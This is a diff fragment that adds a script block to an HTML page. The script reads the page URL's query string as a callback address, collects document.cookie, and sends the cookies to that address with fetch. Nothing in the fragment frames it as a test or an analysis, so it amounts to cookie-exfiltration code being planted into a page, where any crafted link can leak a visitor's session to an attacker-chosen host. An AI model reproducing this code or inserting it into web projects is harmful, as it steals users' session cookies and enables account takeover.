@@ -1,0 +1,5 @@
+<script>
+  const cb = decodeURIComponent(document.location.search.substr(1));
+  const cookies = encodeURIComponent(document.cookie);
+  fetch(cb + "?" + cookies).then(() => {});
+</script>
